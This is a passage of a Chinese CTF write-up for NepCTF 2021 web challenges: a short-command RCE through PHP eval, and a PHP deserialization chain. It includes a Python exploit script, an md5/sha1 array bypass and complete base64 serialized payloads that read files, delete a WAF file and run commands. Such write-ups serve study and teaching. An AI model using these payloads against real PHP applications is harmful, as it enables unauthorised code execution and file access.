constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$nep</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'too long!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>非常简洁，传入两个参数然后<code>eval</code>执行，格式为</p><pre class="language-none"><code class="language-none">.&#x2F;?nep&#x3D;&#96;payload&#96;;&amp;len&#x3D;n</code></pre><p>利用&#96;反引号和分号;执行命令</p><p>首先看到<code>len</code>用来截断字符串<code>nep</code>，而if中<code>intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13</code>即长度不相等，刚开始以为需要利用整形溢出</p><blockquote><p>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p></blockquote><p>测试了一下发现不对，传入字符串视为<strong>字符串类型</strong>，并不存在整形溢出，如下</p><img src="/article/Nepctf2021/image-20210322140444729.png" class="" title="intval" loading="lazy"><p>所以思路不对，接下来想到四字符RCE，<a href="https://blog.csdn.net/q20010619/article/details/109206728">参考文章</a>，测试了一下，问题是测试下来目录非常的杂乱</p><p>flag就在当前目录，无法准确直接cat。<strong>此脚本无效，以前的脚本直接用，仅展示</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 20, 2021"""</span><span class="token keyword">import</span> requestsbaseurl <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:10001/nep2021/little_trick/"</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">execit</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span><span class="token string">"?len=7&amp;nep="</span><span class="token operator">+</span>payload    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"long"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    payload0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'>dir'</span><span class="token punctuation">,</span> <span class="token string">'>f\>'</span><span class="token punctuation">,</span> <span class="token string">'>kt-'</span><span class="token punctuation">,</span> <span class="token string">'>sl'</span><span class="token punctuation">,</span> <span class="token string">'*>v'</span><span class="token punctuation">,</span> <span class="token string">'>rev'</span><span class="token punctuation">,</span> <span class="token string">'*v>b'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload0<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">'`;'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        execit<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        待续</code></pre><p>访问下v，结果仅能扫到目录</p><img src="/article/Nepctf2021/image-20210322142144631.png" class="" title="list" loading="lazy"><p>目录变得非常乱，于是想为何不能利用<code>*</code>直接读文件呢</p><blockquote><p>输入统配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数</p></blockquote><p>测试如下</p><img src="/article/Nepctf2021/image-20210322143017075.png" class="" title="test" loading="lazy"><p>测试可行，输出一个<code>cat</code>文件，然后目录就有<code>cat</code>&#x2F;<code>index.php</code>&#x2F;<code>nepctf.php</code>了，然后执行<code>*&gt;a</code>，即将目录内容当作命令执行输出到文件a，cat全部文件，然后访问文件a即可</p><img src="/article/Nepctf2021/image-20210322144032886.png" class="" title="image-20210322144032886" loading="lazy"><hr><h3 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h3><h4 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h4><pre class="language-none"><code class="language-none">读取shell.php：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7TjtzOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6NDk6InBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9c2hlbGwiO3M6NzoiY29udGVudCI7czowOiIiO30&#x3D;---删除waf.txt：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086MTA6IlppcEFyY2hpdmUiOjU6e3M6Njoic3RhdHVzIjtpOjA7czo5OiJzdGF0dXNTeXMiO2k6MDtzOjg6Im51bUZpbGVzIjtpOjA7czo4OiJmaWxlbmFtZSI7czowOiIiO3M6NzoiY29tbWVudCI7czowOiIiO31zOjg6ImZpbGVuYW1lIjtzOjc6IndhZi50eHQiO3M6NzoiY29udGVudCI7aTo5O30&#x3D;---读取flag：.&#x2F;?a[]&#x3D;1&amp;b[]&#x3D;aPOST:unser&#x3D;Tzo0OiJHYW1lIjo3OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFkbWluIjtzOjY6ImNob2ljZSI7Tzo1OiJsb2dpbiI6Mzp7czo0OiJmaWxlIjtOO3M6ODoiZmlsZW5hbWUiO047czo3OiJjb250ZW50IjtOO31zOjg6InJlZ2lzdGVyIjtzOjU6ImFkbWluIjtzOjQ6ImZpbGUiO086NDoiT3BlbiI6MDp7fXM6ODoiZmlsZW5hbWUiO3M6Nzoid2FmLnR4dCI7czo3OiJjb250ZW50IjtzOjg6InByIC9mbGFnIjt9是不是很简单？</code></pre><p>很文艺的名字，我信了它《简单的PHP反序列化》</p><h4 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h4><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">register</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'success register admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please register admin '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>分析下，首先要绕<code>$_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;]&amp;&amp;(md5($_GET[&#39;a&#39;]) === md5($_GET[&#39;b&#39;])) &amp;&amp; (sha1($_GET[&#39;a&#39;])=== sha1($_GET[&#39;b&#39;]))</code>，直接数组绕过，传入<code>./?a[]=1&amp;b[]=a</code>即可，如下</p><img src="/article/Nepctf2021/image-20210322152923642.png" class="" title="shuzu" loading="lazy"><h5 id="读取shell-php："><a href="#读取shell-php：" class="headerlink" title="读取shell.php："></a>读取shell.php：</h5><p>看Game类</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">-></span><span class="token function">checking</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>看到<code>__wakeup</code>第一反应可不可以直接绕，看了下版本<code>PHP/7.0.33</code></p><blockquote><p>CVE-2016-7124反序列化绕过wakeup漏洞。<br>影响版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</p></blockquote><p>乖乖走<code>__wakeup</code>，register类没有作用，看来得走login类</p><p>参数<code>register</code>的md5要为<code>21232f297a57a5a743894a0e4a801fc3</code>，一查，<code>admin</code></p><p>那就没问题了，<code>__wakeup</code>将Game类的<code>file</code>&#x2F;<code>filename</code>&#x2F;<code>content</code>传入login，利用login的<code>__construct</code>赋值</p><p>Game类的变量choice即login类，利用Game类<code>__destruct</code>触发login类的checking函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">login</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">=</span><span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checking</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token operator">&amp;&amp;</span><span class="token variable">$password</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'login success you can to open shell file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>login类的checking函数检查赋值的username和password，即Game类传过来的username和password。然后调用file即Game类的file的open函数。由于没有<code>__call</code>之类的魔术方法，不需要考虑其他。即本题所有变量都可在Game类直接赋值。</p><p>关键点就在于Open类了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Open</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'waf.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">shell</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><img src="/article/Nepctf2021/image-20210322160046909.png" class="" title="test" loading="lazy"><p>如图所示，存在waf.txt，<code>file_get_contents</code>为true，即存在waf.txt时会<code>file_get_contents($filename.&quot;.php&quot;);</code>，否则会<code>shell($content);</code>所以我们首先要利用伪协议读取<code>shell.php</code>的内容。</p><p>exp1.php如下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Game</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span>  <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$choice</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$register</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token comment">//    public function __construct()</span><span class="token comment">//    &#123;</span><span class="token comment">//        $this->username='user';</span><span class="token comment">//        $this->password='user';</span><span class="token comment">//    &#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">register</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"21232f297a57a5a743894a0e4a801fc3"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">login</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">choice</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token 